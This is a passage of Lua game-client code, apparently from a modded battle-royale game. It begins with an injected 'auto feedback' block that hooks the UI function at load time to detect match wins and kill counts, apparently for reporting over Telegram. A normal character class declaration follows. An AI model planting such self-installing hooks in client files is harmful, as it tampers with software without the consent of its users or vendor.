					kills = tonumber(result.BP_mykill) or 0
				end
			end
		end
	end)
	return kills
end

local function AF_TryInstallHook()
	pcall(function()
		local UIManager = _G.UIManager
		if not UIManager or not UIManager.ShowUI then return end
		if UIManager.__SRCHUBHooked then
			UIManager.__SRCHUBHooked = false
		end
		AF_Log("Hooking UIManager.ShowUI for in-game Winner UI...")
		local originalShowUI = UIManager.ShowUI
		UIManager.ShowUI = function(config, params, ...)
			local result = originalShowUI(config, params, ...)
			pcall(function()
				-- ✅ STRONG WINNER DETECTION - Chicken Dinner Fix
				if not params then return end

				local isWinner = params.Reason == "win"
					or params.ShowedWinLogo == true
					or params.IsWin == true
					or params.IsWinner == true
					or params.bWin == true
					or params.Win == true

				if not isWinner then return end

				local kills = AF_GetWinnerKills()
				if not AF_AddTimerOnce(2, function() AutoFeedback.ProcessWin(kills) end) then
					AutoFeedback.ProcessWin(kills)
				end
			end)
			return result
		end
		-- UIManager.__SRCHUBHooked = true
		AF_Log("UIManager Hook installed successfully.")
	end)
end

function AutoFeedback.Install()
	AF_Log("Installing Pro system (Telegram)...")
	if AutoFeedback.Config.TestMode then
		pcall(function()
			AF_AddTimerOnce(5.0, function() AutoFeedback.ProcessWin() end)
		end)
	end
	pcall(function()
		local ticker = AF_GetModule("common.time_ticker")
		if ticker and type(ticker.AddTimer) == "function" then
			ticker.AddTimer(3.0, AF_TryInstallHook)
		else
			AF_TryInstallHook()
		end
	end)
end

_G.GODxRJ_AutoFeedbackRecovered = AutoFeedback
AutoFeedback.Install()
-- ============================================================
-- END AUTO FEEDBACK SYSTEM
-- ============================================================

local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)
return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
  {
    SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature"
  },
  {
    CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature"
  },
  {
    SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature"
  },
  {
    TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature"
  },
  {
    LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature"
  },
  {
    FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature"
  },
  {
    CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature"
  },
  {
    BuildSkateFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature"
  },
  {
    CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.HeroPropFeature.CommonBornlandTransformFeature"
  },
  {
    ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature"
  }
}, "BRPlayerCharacterBase")